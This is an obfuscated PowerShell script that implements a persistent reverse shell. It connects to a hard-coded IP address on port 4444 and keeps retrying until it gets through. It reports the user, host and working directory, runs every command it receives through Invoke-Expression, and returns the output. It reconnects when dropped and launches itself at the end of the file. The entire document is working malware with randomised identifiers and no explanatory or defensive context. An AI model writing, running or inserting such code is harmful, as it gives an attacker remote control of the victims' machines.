class QFMoPvMtxYGrbYHYizVtA {
    
    [string]$aJYLMxKVbhkWcVDwnHpg = "93.49.240.195"
    [int]$onpkHeNjJhvoJaE = 4444

    $OFEoKmryfSW
    $NPoWfNSJVVnjsMHvQkcdGWGC
    $wwMpnaYAvgjuWSYhdIj
    $FxFye
    $zHlkHEXIMGPXBXnYGI
    $pJMTmzmsMPEOPNx
    [int]$lBFbOMnVvUGlJQkmcRy = 50*1024

    WyHLGbrCwOtMbwUqSRikFU() {
        $this.NPoWfNSJVVnjsMHvQkcdGWGC = $false
        while ($true) {
            try {
                $this.NPoWfNSJVVnjsMHvQkcdGWGC = New-Object Net.Sockets.TcpClient($this.aJYLMxKVbhkWcVDwnHpg, $this.onpkHeNjJhvoJaE)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.ftYou()
    }

    ftYou() {
        $this.OFEoKmryfSW = $this.NPoWfNSJVVnjsMHvQkcdGWGC.GetStream()
        $this.FxFye = New-Object Byte[] $this.lBFbOMnVvUGlJQkmcRy
        $this.pJMTmzmsMPEOPNx = New-Object Text.UTF8Encoding
        $this.wwMpnaYAvgjuWSYhdIj = New-Object IO.StreamWriter($this.OFEoKmryfSW, [Text.Encoding]::UTF8, $this.lBFbOMnVvUGlJQkmcRy)
        $this.zHlkHEXIMGPXBXnYGI = New-Object System.IO.StreamReader($this.OFEoKmryfSW)
        $this.wwMpnaYAvgjuWSYhdIj.AutoFlush = $true
    }

    KttQkodqKppUgYukfEdx() {
        $this.WyHLGbrCwOtMbwUqSRikFU()
        $this.acvhRpE()
    }

    jmycPTW($hYLXfvOWnJHhy) {
        try {
            [byte[]]$iEHPDLlfeHrNru = [text.Encoding]::Ascii.GetBytes($hYLXfvOWnJHhy)
            $this.wwMpnaYAvgjuWSYhdIj.Write($iEHPDLlfeHrNru, 0, $iEHPDLlfeHrNru.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.KttQkodqKppUgYukfEdx()
        }
    }

    [string] GeLllGcVyLxVnKt() {
        try {
            $YLRWM = $this.OFEoKmryfSW.Read($this.FxFye, 0, $this.lBFbOMnVvUGlJQkmcRy)    
            $cAigaxOrwmTLYw = ($this.pJMTmzmsMPEOPNx.GetString($this.FxFye, 0, $YLRWM))
            return $cAigaxOrwmTLYw
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.KttQkodqKppUgYukfEdx()
            return ""
        }
    }

    [string] BHgvwDg($AQAStoEaoTloEGeECKgxce) {
        Write-Host $AQAStoEaoTloEGeECKgxce
        try { 
            $cQABfMoCSVUcAmCnIEHArX = Invoke-Expression $AQAStoEaoTloEGeECKgxce | Out-String
        }
        catch {
            $LNHyB = $_.Exception
            $KmYuuBlQsuuBTpNfH = $_.Message
            $cQABfMoCSVUcAmCnIEHArX = "`n$_`n"
        }
        return $cQABfMoCSVUcAmCnIEHArX
    }

    [string] CvNJAamaUVQIEgLub() {
        $HGEAHJNh = [Environment]::UserName
        $RQtkO = [System.Net.Dns]::GetHostName()
        $ujCfZdiepvedetJYbyYDvTJ = Get-Location
        return "$HGEAHJNh@$RQtkO [$ujCfZdiepvedetJYbyYDvTJ]~$ "
    }

    acvhRpE() {
        while ($this.NPoWfNSJVVnjsMHvQkcdGWGC.Connected) {
            $this.jmycPTW($this.CvNJAamaUVQIEgLub())         
            $cAigaxOrwmTLYw = $this.GeLllGcVyLxVnKt()
            $cQABfMoCSVUcAmCnIEHArX = "`n"
            if ([string]::IsNullOrEmpty($cAigaxOrwmTLYw)) {
                continue
            }
            $cQABfMoCSVUcAmCnIEHArX = $this.BHgvwDg($cAigaxOrwmTLYw)
            $this.jmycPTW($cQABfMoCSVUcAmCnIEHArX + "`n")
            $this.OFEoKmryfSW.Flush()
        }
        $this.NPoWfNSJVVnjsMHvQkcdGWGC.Close()
        $this.KttQkodqKppUgYukfEdx()
    } 
}

$dOGaGoM = [QFMoPvMtxYGrbYHYizVtA]::new()
$dOGaGoM.KttQkodqKppUgYukfEdx()
